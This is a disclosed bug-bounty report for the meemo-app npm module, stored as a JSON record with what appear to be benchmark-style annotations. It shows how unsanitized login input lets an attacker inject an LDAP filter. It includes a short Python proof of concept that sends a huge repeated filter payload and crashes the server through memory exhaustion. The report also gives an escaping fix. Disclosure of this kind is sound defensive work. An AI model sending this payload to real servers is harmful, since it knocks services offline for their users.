{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[meemo-app] Denial of Service via LDAP Injection",
  "content": "\nI would like to report Denial of service via LDAP Injection vulnerability in meemo-app module.\nIt allows a malicious attacker to send a crafted input that is interpreted as an LDAP filter, leading to Denial of Service.\nModule\nmodule name: meemo-app\nversion: 1.9.2\nnpm page: https://www.npmjs.com/package/meemo-app\nModule Description\nMeemo is a personal data manager. It lets you simply input any kind of information like notes, thoughts, ideas as well as acts as a bookmarkmanager and todo list. The user interface resembles a news feed organized with tags. Full text search further allows you to quickly find information in your pile of accumulated data.\nFor better bookmarking, there are chrome and firefox webextensions available.\nModule Stats\n[1] weekly downloads\nVulnerability\nVulnerability Description\nThe module is vulnerable to a DoS via LDAP Injection.\nThe causes of this vulnerability are the same of another report here #906959.\nBelow the vulnerable code:\nCode 3.31 KiB\n1...\n2function verify(username, password, callback) {\n3    profile(username, true, function (error, result) {\n4        if (error) return callback(error);\n5\n6        if (process.env.CLOUDRON_LDAP_URL) {\n7            var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n8            ldapClient.on('error', function (error) {\n9                console.error('LDAP error', error);\n10                callback(new UserError(UserError.INTERNAL_ERROR, error));\n11            });\n12\n13            var ldapDn = 'cn=' + result.username + ',' + process.env.CLOUDRON_LDAP_USERS_BASE_DN;\n14\n15            ldapClient.bind(ldapDn, password, function (error) {\n16                if (error) return callback(new UserError(UserError.NOT_AUTHORIZED));\n17\n18                callback(null, { user: result });\n19            });\n20        } else {\n21            bcrypt.compare(password, result.passwordHash, function (error, valid) {\n22                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n23                if (!valid) return callback(new UserError(UserError.NOT_AUTHORIZED));\n24\n25                // strip passwordHash\n26                delete result.passwordHash;\n27\n28                callback(null, { user: result });\n29            });\n30        }\n31    });\n32}\n33\n34// https://github.com/nebulade/meemo/blob/master/src/users.js#L84\n35// identifier may be userId, email, username\n36function profile(identifier, full, callback) {\n37    assert.strictEqual(typeof identifier, 'string');\n38    assert.strictEqual(typeof full, 'boolean');\n39    assert.strictEqual(typeof callback, 'function');\n40\n41    if (process.env.CLOUDRON_LDAP_URL) {\n42        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n43        ldapClient.on('error', function (error) {\n44            console.error('LDAP error', error);\n45        });\n46\n47        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n48            if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n49\n50            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: '(|(uid=' + identifier + ')(mail=' + identifier + ')(username=' + identifier + ')(sAMAccountName=' + identifier + '))' }, function (error, result) {  //<-- INJECTION: identifier is not sanitized\n51                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n52\n53                var items = [];\n54\n55                result.on('searchEntry', function(entry) {\n56                    items.push(entry.object);\n57                });\n58\n59                result.on('error', function (error) {\n60                    callback(new UserError(UserError.INTERNAL_ERROR, error));\n61                });\n62\n63                result.on('end', function (result) {\n64                    if (result.status !== 0) return callback(new UserError(UserError.NOT_FOUND, 'non-zero status from LDAP search: ' + result.status));\n65                    if (items.length === 0) return callback(new UserError(UserError.NOT_FOUND, 'No LDAP entries found'));\n66\n67                    if (full) return callback(null, items[0]);\n68\n69                    var out = {\n70                        username: items[0].username,\n71                        displayName: items[0].displayname,\n72                        email: items[0].mail\n73                    };\n74\n75                    callback(null, out);\n76                });\n77            });\n78        });\n79...\n80\nCode 1.12 KiB\n1...\n2exports = module.exports = {\n3    auth: auth,\n4    login: login,\n5    logout: logout,\n6    profile: profile,\n7\n8...\n9// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86\n10function login(req, res, next) {\n11    if (typeof req.body.username !== 'string' || !req.body.username) return next(new HttpError(400, 'missing username'));\n12    if (typeof req.body.password !== 'string' || !req.body.password) return next(new HttpError(400, 'missing password'));\n13\n14    users.verify(req.body.username, req.body.password, function (error, result) {\n15        if (error && error.code === UserError.NOT_FOUND) return next(new HttpError(401, 'invalid credentials'));\n16        if (error && error.code === UserError.NOT_AUTHORIZED) return next(new HttpError(401, 'invalid credentials'));\n17        if (error) return next(new HttpError(500, error));\n18\n19        req.session.userId = result.user.username;\n20\n21        var token = uuid.v4();\n22        tokens.add(token, '', result.user.username, function (error) {\n23            if (error) return next(new HttpError(500, error));\n24            next(new HttpSuccess(201, { token: token, user: result.user }));\n25        });\n26    });\n27}\n28...\nCode 108 Bytes\n1// https://github.com/nebulade/meemo/blob/master/app.js#L55\n2...\n3router.post('/api/login', routes.login);\n4...\nSteps To Reproduce:\nTo test this app on a real live system, you need first to install Cloudron (https://cloudron.io/get.html) and then install the Meemo app (https://cloudron.io/store/de.nebulon.guacamoly.html). In order to install the Cloudron app you need first a domain.\nInstead of the above setting, I tested the app locally.\nBelow steps to reproduce the vulnerability.\nTo simulate an LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver) (you can find attached).\ninstall (https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/) and start MongoDB:\nsudo systemctl start mongod\nsudo systemctl start mongod\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall meemo-app module:\ngit clone https://github.com/nebulade/meemo.git\ncd meemo\nnpm i\n./node_modules/.bin/gulp\ngit clone https://github.com/nebulade/meemo.git\ncd meemo\nnpm i\n./node_modules/.bin/gulp\nstart the LDAP test server (we are in poc/meemo/):\nnode ldapjstestserver.js\nnode ldapjstestserver.js\nstart the meemo app locally (we need to setup some environment variables to enable the LDAP authentication):\nCLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node app.js\nCLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node app.js\nBefore performing the attack let's first check that everything works as expected:\nvisit http://localhost:3000/\nenter normal and test respectively in the username and password fields and the click enter\nlogout\nReproduce the attack:\nvisit http://localhost:3000/\nrun the following python script (poc.py):\nCode 370 Bytes\n1import requests\n2import json\n3\n4url = 'http://localhost:3000/api/login'\n5\n6payload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n7\n8print(f\"Payload's length: {len(payload)} characters\")\n9\n10headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}\n11\n12data = {\n13    \"username\": payload,\n14    \"password\": \"pass\"\n15}\n16\n17response = requests.post(url, data=json.dumps(data), headers=headers)\nthe page will load until the server crashes. After some time you will get the following error: FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\nPatch\nSanitize the user input before using it to build LDAP filters.\nPossible solution could be for example this one (taken from another project):\nGithub Issue: Vulnerable to ldap injection\nGithub Commit: Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3):\nCode 1.58 KiB\n1    The rule ensures that the entire filter string is a\n2    valid UTF-8 string and provides that the octets that represent the\n3    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n4    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n5    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n6    representing the value of the encoded octet.\n7\n8    This simple escaping mechanism eliminates filter-parsing ambiguities\n9    and allows any filter that can be represented in LDAP to be\n10    represented as a NUL-terminated string. Other octets that are part\n11    of the set may be escaped using this mechanism, for example,\n12    non-printing ASCII characters.\n13\n14    For AssertionValues that contain UTF-8 character data, each octet of\n15    the character to be escaped is replaced by a backslash and two hex\n16    digits, which form a single octet in the code of the character. For\n17    example, the filter checking whether the \"cn\" attribute contained a\n18    value with the character \"\" anywhere in it would be represented as\n19    \"(cn=\\2a*)\".\n20\n21    As indicated by the rule, implementations MUST escape\n22    all octets greater than 0x7F that are not part of a valid UTF-8\n23    encoding sequence when they generate a string representation of a\n24    search filter. Implementations SHOULD accept as input strings that\n25    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n26    not clearly define the term \"string representation\" (and in\n27    particular did not mention that the string representation of an LDAP\n28    search filter is a string of UTF-8-encoded Unicode characters).\nSupporting Material/References:\nSome helpful resources I used for this research:\nLDAP injection\nLDAP Filters\nBlackHat: LDAP Injection & Blind LDAP Injection\nUnderstanding and Defending Against LDAP Injection Attacks\nLDAP Injection Prevention Cheat Sheet\nLdapjs - orfilter\nMy setup:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.2.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nDenial of service\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "LDAP Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1598100480,
  "report_url": "https://hackerone.com/reports/907311",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Set up a local environment with MongoDB, Meemo app, and LDAP test server"
    ],
    [
      2,
      "Send a crafted LDAP injection payload to the login endpoint to trigger the DoS"
    ]
  ],
  "vuln_description": "The vulnerability is a Denial of Service (DoS) via LDAP Injection in the meemo-app module. It occurs when a malicious attacker sends a crafted input that is interpreted as an LDAP filter, causing the server to consume excessive resources and crash.",
  "reason": "The attack involves setting up multiple components (MongoDB, Meemo app, LDAP server) and crafting a specific LDAP injection payload. However, the LDAP injection technique is well-known and the steps to reproduce are straightforward once the environment is set up.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "906959",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves LDAP injection in the authentication process where user input is not sanitized before being used in LDAP queries. The proposed methodology involves testing authentication and authorization boundaries by manipulating user sessions and resource IDs, which would include testing for improper input sanitization in authentication flows.",
    "is_detectable": true
  }
}